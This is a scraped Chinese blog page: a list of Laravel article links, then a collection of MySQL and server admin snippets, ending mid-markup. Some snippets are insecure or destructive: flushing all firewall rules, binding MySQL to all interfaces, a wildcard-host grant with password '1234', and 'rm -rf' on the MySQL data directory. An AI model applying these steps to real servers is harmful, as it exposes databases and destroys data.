<p><a href="https://laravel-china.org/articles/21985" target="_blank" rel="noopener">Facades 原理 (代码执行流程分析)</a></p>
<p><a href="https://laravel-china.org/articles/20802#5db9fd" target="_blank" rel="noopener">Laravel 源码阅读之二：Illuminate\Foundation\Application 类初始化分析</a></p>
<p><a href="https://laravel-china.org/articles/7037/laravel-queue-analysis-of-message-queue-tasks-and-distribution-source-code#9a853c" target="_blank" rel="noopener">Laravel Queue——消息队列任务与分发源码剖析</a></p>
<p> <a href="https://laravel-china.org/articles/6189/laravel-service-provider-detailed-concept" target="_blank" rel="noopener">Laravel Service Provider 概念详解</a></p>
<p> <a href="https://github.com/kevinyan815/Learning_Laravel_Kernel" target="_blank" rel="noopener">Laravel核心代码学习</a></p>
<p> <a href="https://laravel-china.org/articles/19878" target="_blank" rel="noopener">Laravel 启动流程分析 (代码全流程)</a></p>
<p><a href="https://laravel-china.org/articles/19785#3170db" target="_blank" rel="noopener">生命周期 5 管道流分析</a></p>
<p><a href="https://laravel-china.org/articles/22617?#reply79267" target="_blank" rel="noopener">Laravel 5.7 嵌套集基础教程</a></p>
<p><a href="https://www.jianshu.com/p/8ea43b1a83df" target="_blank" rel="noopener">laravel-mysql读写分离</a></p>
<p><a href="https://github.com/huanghua581/FATA" target="_blank" rel="noopener">Laravel 框架涉及的各种软件理念和工具</a></p>
<p><a href="https://blog.gxxsite.com/lumen-advance-database-interaction/" target="_blank" rel="noopener">Lumen 进阶之数据库交互</a></p>
<p><a href="https://www.v2ex.com/t/434082" target="_blank" rel="noopener">Laravel 开发 RESTful API 的心得</a></p>
<p><a href="https://learnku.com/articles/20528" target="_blank" rel="noopener">深入研究 larvael 源码第三天</a></p>
<p><a href="https://segmentfault.com/a/1190000010787709" target="_blank" rel="noopener">Laravel队列实现原理解决问题记录</a></p>
<p><a href="https://www.0php.net/posts/Laravel-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E8%A7%A3%E6%9E%90.html" target="_blank" rel="noopener">LARAVEL 生命周期解析</a></p>
<p><a href="https://learnku.com/laravel/t/17508" target="_blank" rel="noopener">搭建 Laravel 运行环境线上 LNMP</a></p>
<p><a href="https://learnku.com/articles/12555/laravel-source-code-reading-guide-reflection-and-dependency-injection-for-class-php" target="_blank" rel="noopener">Laravel 源码阅读指南 – PHP 类的反射和依赖注入</a></p>
<p><a href="https://learnku.com/laravel/t/24767" target="_blank" rel="noopener">自动化测试：六个值得参考的 Laravel 开源项目</a></p>
<p><a href="https://learnku.com/articles/17830" target="_blank" rel="noopener">Laravel 源码阅读指南 – Contracts 契约</a></p>
<p><a href="https://learnku.com/laravel/wikis/7227" target="_blank" rel="noopener">Laravel 入门指南</a></p>
<p><a href="https://learnku.com/articles/19876" target="_blank" rel="noopener">Laravel Eloquent 提示和技巧</a></p>
<p><a href="https://learnku.com/articles/25066" target="_blank" rel="noopener">laravel Elasticsearch 实现简单搜索</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/07/mysql片段收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/07/mysql片段收集/" itemprop="url">mysql片段收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-07T15:13:54+08:00">
                2019-01-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  41.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  191 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Mysql使用别名多表查询join时问题"><a href="#Mysql使用别名多表查询join时问题" class="headerlink" title="Mysql使用别名多表查询join时问题"></a>Mysql使用别名多表查询join时问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM t1, t2 LEFT JOIN t3 ON (t1.id=t3.id) WHERE t1.id=t2.id</span><br><span class="line">但是在执行的时候报错“Unknown column t1.id”,以前博主习惯利用AS 表别名来进行多表关联查询，这让博主很凌乱，一时不知道如何下手解决了</span><br><span class="line">实际上执行 SELECT * FROM t1,( t2 LEFT JOIN t3 ON (t1.id=t3.id)) WHERE t1.id=t2.id</span><br><span class="line"></span><br><span class="line">SELECT * FROM t1 INNER JOIN t2 LEFT JOIN t3 ON (t1.id=t3.id) WHERE t1.id=t2.id</span><br></pre></td></tr></table></figure>
<h3 id="重置root密码"><a href="#重置root密码" class="headerlink" title="重置root密码"></a>重置root密码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">kill <span class="string">`cat /mysql-data-directory/host_name.pid`</span></span><br><span class="line">#ps方法</span><br><span class="line">ps aux|grep <span class="string">'mysql'</span></span><br><span class="line">#这里把%pid%替换为上面ps给的进程id</span><br><span class="line">sudo kill %pid%</span><br><span class="line">#5.7.6和以后版本</span><br><span class="line">ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED BY <span class="string">'MyNewPass'</span>;</span><br><span class="line">#5.7.6以前版本</span><br><span class="line">SET PASSWORD FOR <span class="string">'root'</span>@<span class="string">'localhost'</span> = PASSWORD(<span class="string">'MyNewPass'</span>);</span><br><span class="line">#官网手册命令，mac用户不推荐</span><br><span class="line"> </span><br><span class="line">mysqld_safe --init-file=<span class="regexp">/home/m</span>e/mysql-init &amp;</span><br><span class="line"> </span><br><span class="line">#mac用户推荐命令</span><br><span class="line"> </span><br><span class="line">sudo /usr/local/mysql/bin/mysqld --user=_mysql --basedir=<span class="regexp">/usr/</span>local/mysql --datadir=<span class="regexp">/usr/</span>local/mysql/data --plugin-dir=<span class="regexp">/usr/</span>local/mysql/lib/plugin --log-error=<span class="regexp">/usr/</span>local/mysql/data/mysqld.local.err --pid-file=<span class="regexp">/usr/</span>local/mysql/data/mysqld.local.pid --init-file=<span class="regexp">/Users/</span>king/sql/alter_root.sql &amp;</span><br><span class="line"><span class="number">1.</span> 停止mysql服务:</span><br><span class="line">systemctl stop mysqld</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 设置mysql的环境变量参数 </span><br><span class="line">systemctl set-environment MYSQLD_OPTS=<span class="string">"--skip-grant-tables"</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 启动mysql服务</span><br><span class="line">systemctl start mysqld</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> root无密码登录</span><br><span class="line">mysql -u root</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> 更新root密码</span><br><span class="line">mysql&gt; UPDATE mysql.user SET authentication_string = PASSWORD(<span class="string">'MyNewPassword'</span>)</span><br><span class="line">    -&gt; WHERE User = <span class="string">'root'</span> AND Host = <span class="string">'localhost'</span>;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">mysql&gt; quit</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> 关闭mysql服务</span><br><span class="line">systemctl stop mysqld</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> 删除mysql环境参数</span><br><span class="line">systemctl unset-environment MYSQLD_OPTS</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> 再次启动:</span><br><span class="line">systemctl start mysqld</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> 用root登录:</span><br><span class="line">. mysql -u root -p</span><br></pre></td></tr></table></figure>
<h3 id="mysql5-7无法远程连接问题"><a href="#mysql5-7无法远程连接问题" class="headerlink" title="mysql5.7无法远程连接问题"></a>mysql5.7无法远程连接问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line"> </span><br><span class="line">use mysql;</span><br><span class="line"> </span><br><span class="line">select * <span class="keyword">from</span> user\G;</span><br><span class="line">sudo iptables -L #查看防火墙规则列表</span><br><span class="line"> </span><br><span class="line">sudo iptables -F  #清空防火墙列表</span><br><span class="line">vi /etc/mysql/mysql.conf.d/mysqld.cnf</span><br><span class="line">#bind-address = 127.0.0.1</span><br><span class="line">bind-address = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<h3 id="select-导致的mysql线程sending-data"><a href="#select-导致的mysql线程sending-data" class="headerlink" title="select *导致的mysql线程sending data"></a>select *导致的mysql线程sending data</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">当有大量的”select * <span class="keyword">from</span> xxx”存在时，虽然这个表的数据量不是很大，只有区区几千条记录记录，但是大量的查询引起mysql线程状态卡在”sending data”时，服务器的负载就上来了。</span><br><span class="line"></span><br><span class="line">那么什么是”sending data”状态哪?其实这是一个很容易引起误导的状态说明，”sending data”是包含读取数据+发送数据的。这里以innodb存储引擎来说，我们在使用索引找到我们所需的记录时，期初得到是索引列信息和主键信息，如果我们查询的信息索引列中已经包含，那么万事大吉，mysql会把这些信息发送给客户端。但是如果像我的例子中的是使用”select *”这种情况，或者要索引列中未包含我们需要需要的更多信息，那么这时mysql就会拿着主键id去数据行获取信息，然后再把些信息发送给客户端。</span><br><span class="line"></span><br><span class="line">现在回到上面的问题，我们数据表记录数不多，为什么会引起”sending data”哪?我们活动信息表有几个字段是MEDIUMTEXT或者VARCHAR(<span class="number">3000</span>)类似这种要存储比较长字符串内容的字段，所以在使用”select *”时我们把本来不需要，但是却占用很大空间的字段也返回了，造成了大量无用的IO操作，这里包含读取数据和发送数据。由于接口我们使用的是被动缓存，所以活动刚开始时这些请求都打到了数据库，后面接口缓存生效以后数据库压力就降下来了。</span><br><span class="line"></span><br><span class="line">开发框架使用的是Lumen,而且我们主要使用的是里面的ORM-Elopment,有些地方没有注意查询时设定字段就引起了这个问题，说句实话以前在使用ORM时，我一直没有养成限制返回字段的习惯。希望看到这篇文章的同学也能引以为戒，以后尽量不要使用”seleect *”这样粗暴的查询方式。</span><br></pre></td></tr></table></figure>
<h3 id="lumen数据库时区设置"><a href="#lumen数据库时区设置" class="headerlink" title="lumen数据库时区设置"></a>lumen数据库时区设置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.helpergarden.com/2018/05/lumen%e6%95%b0%e6%8d%ae%e5%ba%93%e6%97%b6%e5%8c%ba%e8%ae%be%e7%bd%ae.html</span></span><br><span class="line">timestamp里面居然保存的居然是带时区的</span><br><span class="line">查看ORM源码，它的注释里面说日期类型的字符创会转化成“DateTime/Carbon”实例，然后再进一步处理是输出或者存入数据库。</span><br><span class="line"></span><br><span class="line">我们可以通过在.env中设置”DB_TIMEZONE”来解决时区不一致的问题。</span><br><span class="line"></span><br><span class="line">DB_TIMEZONE=+<span class="number">8</span>:<span class="number">00</span></span><br><span class="line">一般来说要保证我们设置DB_TIMEZONE和APP_TIMEZONE一致的，所以一般配置文件都是这样的。</span><br><span class="line"></span><br><span class="line">APP_TIMEZONE=Asia/Shanghai</span><br><span class="line">DB_TIMEZONE=+<span class="number">8</span>:<span class="number">00</span></span><br></pre></td></tr></table></figure>
<h3 id="nginx跨域设置"><a href="#nginx跨域设置" class="headerlink" title="nginx跨域设置"></a>nginx跨域设置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">       index  index.html index.htm index.php;</span><br><span class="line">       autoindex on;</span><br><span class="line">       try_files $uri $uri/ <span class="regexp">/index.php?$query_string;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">include cors.conf;</span></span><br><span class="line"><span class="regexp">vi cors.conf </span></span><br><span class="line"><span class="regexp">add_header Access-Control-Allow-Origin *;</span></span><br><span class="line"><span class="regexp">add_header Access-Control-Allow-Methods 'GET, POST, OPTIONS';</span></span><br><span class="line"><span class="regexp">add_header Access-Control-Allow-Headers 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization';</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">if ($request_method = 'OPTIONS') &#123;</span></span><br><span class="line"><span class="regexp">    return 204;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="swoole-process父子进程使用队列通信"><a href="#swoole-process父子进程使用队列通信" class="headerlink" title="swoole process父子进程使用队列通信"></a>swoole process父子进程使用队列通信</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//http://www.helpergarden.com/2018/05/swoole-process%e7%88%b6%e5%ad%90%e8%bf%9b%e7%a8%8b%e4%bd%bf%e7%94%a8%e9%98%9f%e5%88%97%e9%80%9a%e4%bf%a1.html</span></span><br><span class="line">$worker_num = <span class="number">2</span>;</span><br><span class="line">$process_pool = [];</span><br><span class="line"></span><br><span class="line">$process= <span class="literal">null</span>;</span><br><span class="line">$pid = posix_getpid();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub_process</span>(<span class="params">swoole_process $worker</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">1</span>); <span class="comment">//防止父进程还未往消息队列中加入内容直接退出</span></span><br><span class="line">    echo <span class="string">"worker "</span>.$worker-&gt;pid.<span class="string">" started"</span>.PHP_EOL;</span><br><span class="line">    <span class="keyword">while</span>($msg = $worker-&gt;pop())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($msg === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $sub_pid = $worker-&gt;pid;</span><br><span class="line">        echo <span class="string">"[$sub_pid] msg : $msg"</span>.PHP_EOL;</span><br><span class="line">        sleep(<span class="number">1</span>);<span class="comment">//这里的sleep模拟必须，否则可能1个worker就把所有信息全接受了</span></span><br><span class="line">    &#125;</span><br><span class="line">    echo <span class="string">"worker "</span>.$worker-&gt;pid.<span class="string">" exit"</span>.PHP_EOL;</span><br><span class="line">    $worker-&gt;exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$customMsgKey = <span class="number">1</span>;<span class="comment">//默认为空，这个地方可以随便填的</span></span><br><span class="line">$mod = <span class="number">2</span> | swoole_process::IPC_NOWAIT;<span class="comment">//这里设置队列为非阻塞模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建worker进程</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$worker_num; $i++) &#123;</span><br><span class="line">    $process=<span class="keyword">new</span> swoole_process(<span class="string">'sub_process'</span>);</span><br><span class="line">    $process-&gt;useQueue($customMsgKey, $mod);</span><br><span class="line">    $process-&gt;start();</span><br><span class="line">    $pid = $process-&gt;pid;</span><br><span class="line">    $process_pool[$pid] = $process;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$messages = [</span><br><span class="line">    <span class="string">"Hello World!"</span>,</span><br><span class="line">    <span class="string">"Hello Cat!"</span>,</span><br><span class="line">    <span class="string">"Hello King"</span>,</span><br><span class="line">    <span class="string">"Hello Leon"</span>,</span><br><span class="line">    <span class="string">"Hello Rose"</span></span><br><span class="line">];</span><br><span class="line"><span class="comment">//由于所有进程是共享使用1个消息队列，所以只需向一个字进程发送消息即可</span></span><br><span class="line">$process = current($process_pool);</span><br><span class="line">foreach ($messages <span class="keyword">as</span> $msg) &#123;</span><br><span class="line">    $process-&gt;push($msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">swoole_process::wait();</span><br><span class="line">swoole_process::wait();</span><br><span class="line"></span><br><span class="line">echo <span class="string">"master exit"</span>.PHP_EOL;</span><br></pre></td></tr></table></figure>
<h3 id="yum安装elasticsearch"><a href="#yum安装elasticsearch" class="headerlink" title="yum安装elasticsearch"></a>yum安装elasticsearch</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://www.helpergarden.com/2018/03/yum%e5%ae%89%e8%a3%85elasticsearch.html</span></span><br><span class="line">yum install java</span><br><span class="line">yum makecache</span><br><span class="line">yum install elasticsearch</span><br><span class="line">cd /usr/share/elasticsearch</span><br><span class="line">./bin/elasticsearch-plugin install https:<span class="comment">//github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.2.2/elasticsearch-analysis-ik-6.2.2.zip</span></span><br><span class="line">  systemctl start elasticsearch</span><br><span class="line">curl http:<span class="comment">//127.0.0.1:9200</span></span><br><span class="line">访问“http:<span class="comment">//127.0.0.1:9200/_cat/plugins”可以查看es安装的插件。</span></span><br><span class="line"></span><br><span class="line">curl http:<span class="comment">//127.0.0.1:9200/_cat/plugins</span></span><br></pre></td></tr></table></figure>
<h3 id="grant"><a href="#grant" class="headerlink" title="grant"></a>grant</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;grant select,<span class="keyword">delete</span>,update,create,drop on *.* to test@<span class="string">"%"</span> identified by <span class="string">"1234"</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//test用户对所有数据库都有select,delete,update,create,drop 权限。https://laravel-china.org/articles/22147</span></span><br><span class="line">　 @<span class="string">"%"</span> 表示对所有非本地主机授权，不包括localhost。</span><br><span class="line"></span><br><span class="line">　对localhost授权：加上一句grant all privileges on testDB.* to test@localhost identified by <span class="string">'1234'</span>;即可</span><br></pre></td></tr></table></figure>
<h3 id="EXPLAIN-查看SQL执行计划"><a href="#EXPLAIN-查看SQL执行计划" class="headerlink" title="EXPLAIN 查看SQL执行计划"></a>EXPLAIN 查看SQL执行计划</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXPLAIN SELECT ……</span><br><span class="line">EXPLAIN EXTENDED SELECT ……</span><br><span class="line">将执行计划<span class="string">"反编译"</span>成SELECT语句，运行SHOW WARNINGS，可得到被MySQL优化器优化后的查询语句。</span><br><span class="line">EXPLAIN PARTITIONS SELECT ……</span><br><span class="line">用于分区表的EXPLAIN生成QEP的信息</span><br></pre></td></tr></table></figure>
<h3 id="卸载mysql8"><a href="#卸载mysql8" class="headerlink" title="卸载mysql8"></a>卸载mysql8</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_14_centos ~]# rpm -qa|grep mysql</span><br><span class="line"></span><br><span class="line">mysql80-community-release-el7<span class="number">-1.</span>noarch</span><br><span class="line">mysql-community-client<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64</span><br><span class="line">mysql-community-libs<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64</span><br><span class="line">mysql-community-libs-compat<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64</span><br><span class="line">php70w-mysqlnd<span class="number">-7.0</span><span class="number">.32</span><span class="number">-1.</span>w7.x86_64</span><br><span class="line">mysql-community-common<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64</span><br><span class="line">mysql-community-server<span class="number">-8.0</span><span class="number">.13</span><span class="number">-1.</span>el7.x86_64</span><br><span class="line"></span><br><span class="line">yum remove mysql80-community-release-el7<span class="number">-1.</span>noarch</span><br><span class="line">[root@VM_0_14_centos ~]# find / -name mysql</span><br><span class="line">/etc/selinux/targeted/tmp/modules/<span class="number">100</span>/mysql</span><br><span class="line">/etc/selinux/targeted/active/modules/<span class="number">100</span>/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/mysql/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/volumes/<span class="number">68</span>a07333528e60edd5980282ae6b0a3ce2324021eb8ca2f1963adb5a199ade7a/_data/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/volumes/f17d91c72d0178c3746414175662884b29c462146c18fcf775c139a875dbd746/_data/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/volumes/f8f07e5586d9f47cb5ec67a6b1fcd174c60446091e75ad0a920d58afefc8c405/_data/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/overlay2/<span class="number">68559</span>b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/etc/init.d/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/overlay2/<span class="number">68559</span>b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/etc/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/overlay2/<span class="number">68559</span>b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/<span class="keyword">var</span>/lib/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/overlay2/<span class="number">68559</span>b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/<span class="keyword">var</span>/log/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/overlay2/<span class="number">68559</span>b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/usr/bin/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/overlay2/<span class="number">68559</span>b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/usr/lib/mysql</span><br><span class="line">/<span class="keyword">var</span>/lib/docker/overlay2/<span class="number">68559</span>b409701bd076a41a3a062d786093709ba872db563d90ce969222990e3ff/merged/usr/share/mysql</span><br><span class="line"></span><br><span class="line">rm -rf /<span class="keyword">var</span>/lib/mysql</span><br><span class="line">rm -rf /etc/my.cnf</span><br><span class="line">rm -rf /<span class="keyword">var</span>/log/mysqld.log</span><br></pre></td></tr></table></figure>
<h3 id="安装mysql5-7"><a href="#安装mysql5-7" class="headerlink" title="安装mysql5.7"></a>安装mysql5.7</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 